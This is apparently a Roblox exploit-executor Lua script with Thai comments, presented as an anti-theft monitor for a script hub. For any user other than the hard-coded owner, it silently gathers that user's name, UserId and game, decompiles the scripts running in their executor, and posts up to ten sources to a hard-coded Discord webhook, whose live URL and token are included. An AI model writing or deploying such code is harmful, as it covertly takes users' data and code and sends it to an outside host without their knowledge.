local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local lp          = Players.LocalPlayer

local WEBHOOK  = "https://discord.com/api/webhooks/1551247366231822468/b-kbrZjuQPAPSEvFOI1XGkwnuobRkj_8xAAZOL0IkZScD_DLn2IVJ19SeAGGfzLSk7aY"
local MY_USERID = 7989333872 -- ใส่ UserId ของคุณ

-- ถ้าเป็นเจ้าของ ไม่ทำอะไร
if lp.UserId == MY_USERID then return end

-- ============================================================
-- ดึงซอสโค้ดทั้งหมดที่รันอยู่ใน executor ของคนขโมย
-- ============================================================
local function getScripts()
    local found = {}
    local seen  = {}

    -- วิธี 1: get_scripts
    pcall(function()
        if not get_scripts then return end
        for _, s in ipairs(get_scripts()) do
            local src = nil
            pcall(function() src = s.Source end)
            if not src and decompile then
                pcall(function() src = decompile(s) end)
            end
            if src and #src > 30 and not seen[src:sub(1,50)] then
                seen[src:sub(1,50)] = true
                table.insert(found, { name = s.Name or "?", code = src })
            end
        end
    end)

    -- วิธี 2: getgc
    pcall(function()
        if not getgc or not decompile then return end
        for _, v in ipairs(getgc(true)) do
            if type(v) == "function" then
                local ok, src = pcall(decompile, v)
                if ok and src and #src > 30 and not seen[src:sub(1,50)] then
                    seen[src:sub(1,50)] = true
                    local info = debug.getinfo(v)
                    table.insert(found, {
                        name = (info and info.source) or "unknown",
                        code = src
                    })
                end
            end
        end
    end)

    return found
end

-- ============================================================
-- ส่ง Discord
-- ============================================================
local function send(title, desc)
    pcall(function()
        HttpService:RequestAsync({
            Url    = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body   = HttpService:JSONEncode({
                username = "🚨 Lucas-Hub Monitor",
                embeds   = {{
                    title       = title,
                    description = desc,
                    color       = 15548997,
                }}
            })
        })
    end)
end

-- ============================================================
-- ส่งข้อมูลผู้ขโมย
-- ============================================================
local gameName = "?"
pcall(function()
    gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end)

send("⚠️ พบผู้ขโมยสคริป!", string.format(
    "👤 ชื่อ: **%s**\n🆔 UserId: **%d**\n🎮 เกม: **%s**\n📌 PlaceId: **%d**",
    lp.Name, lp.UserId, gameName, game.PlaceId
))

task.wait(1)

-- ============================================================
-- ส่งซอสโค้ด
-- ============================================================
local scripts = getScripts()

if #scripts == 0 then
    send("📜 Source", "⚠️ ดึงไม่ได้ executor ไม่รองรับ")
    return
end

local sent = 0
for _, s in ipairs(scripts) do
    if sent >= 10 then break end
    local code = s.code:sub(1, 1800)
    send("📜 " .. s.name, "```lua\n" .. code .. "\n```")
    sent += 1
    task.wait(1.5)
end

send("✅ ส่งเสร็จแล้ว", "ส่งซอสโค้ดทั้งหมด " .. sent .. " ไฟล์")
